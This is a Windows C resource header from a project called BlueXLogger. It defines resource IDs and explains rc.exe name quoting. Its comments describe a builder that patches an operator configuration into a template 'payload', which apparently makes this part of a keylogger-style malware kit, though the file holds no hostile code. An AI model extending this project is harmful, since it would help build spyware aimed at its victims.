/*============================================================================
 * BlueXLogger - bxl_resid.h
 * Resource identifiers shared by the .rc scripts and the C sources.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * This header is deliberately free of any C-only construct so that rc.exe can
 * preprocess it directly. Keep it to plain object-like #defines.
 *==========================================================================*/
#ifndef BXL_RESID_H
#define BXL_RESID_H

/* Application icon, present in both the payload and the builder. */
#define BXL_RES_ICON          101

/*--------------------------------------------------------------------------
 * Named RCDATA resources.
 *
 * rc.exe stores a QUOTED resource name verbatim, quotes included: writing
 *   "BXL_CFG" RCDATA "res/cfg_slot.bin"
 * produces a resource whose name is the nine characters "BXL_CFG", which no
 * FindResourceW(h, L"BXL_CFG", ...) can ever match. A BARE identifier in the
 * name position is the syntax that yields the plain string name:
 *   BXL_CFG RCDATA "res/cfg_slot.bin"
 *
 * So the *_NAME macros below are intentionally unquoted - they are tokens for
 * rc.exe only and must never be used from C. The *_W macros are the wide
 * strings the C side hands to FindResourceW. Keep the two in step.
 *------------------------------------------------------------------------*/

/* RT_RCDATA slot holding the operator configuration inside the payload.
 * The slot size is fixed at BXL_CFG_SLOT_SIZE and never changes. */
#define BXL_RES_CFG_NAME      BXL_CFG
#define BXL_RES_CFG_W         L"BXL_CFG"

/* RT_RCDATA slot inside BlueXBuilder.exe holding an unconfigured copy of the
 * payload. The builder extracts it and patches the BXL_CFG slot, which is why
 * the builder is a single self-contained executable. */
#define BXL_RES_TEMPLATE_NAME BXL_TEMPLATE
#define BXL_RES_TEMPLATE_W    L"BXL_TEMPLATE"

/* Plain-text copy of the watermark, embedded so the branding survives even if
 * the binary is inspected with a resource viewer. */
#define BXL_RES_ABOUT_NAME    BXL_ABOUT
#define BXL_RES_ABOUT_W       L"BXL_ABOUT"

#endif /* BXL_RESID_H */
